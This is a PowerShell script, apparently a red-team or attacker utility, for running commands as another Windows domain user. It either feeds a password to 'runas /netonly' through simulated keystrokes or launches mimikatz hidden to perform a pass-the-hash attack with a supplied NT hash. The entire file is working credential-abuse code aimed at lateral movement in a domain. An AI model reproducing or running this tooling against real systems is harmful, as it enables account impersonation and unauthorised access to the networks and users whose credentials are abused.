param ([string] $domain, [string] $username, [string] $passwd, [string] $hash, [string] $mpath="mimikatz.exe", [string] $run="cmd.exe")

if ($domain -eq '') {
    write-host "[Error] Please enter a target domain." 
    return
}
if ($username -eq '') {
    write-host "[Error] Please enter a target username." 
    return
}

function Invoke-RunAs {
    $WshShell = New-Object -ComObject "Wscript.Shell"
    Start-Process -NoNewWindow runas -Arg "/netonly","/user:$username@$domain","$run"
    Start-Sleep -Milliseconds 100
    $WshShell.SendKeys($passwd)
    $WshShell.SendKeys("{ENTER}")
    Start-Sleep -Milliseconds 200
}

function Invoke-MimikatzPTH {
    Start-Process $mpath -WindowStyle Hidden -ArgumentList "`"sekurlsa::pth /domain:$domain /user:$username /ntlm:$hash /run:$run`" exit"
}

if ($passwd -ne '') {
    Invoke-RunAs
}
elseif ($hash -ne '') {
    Invoke-MimikatzPTH
}
else {
    write-host "[Error] Please enter a password or NT-hash." 
    return
}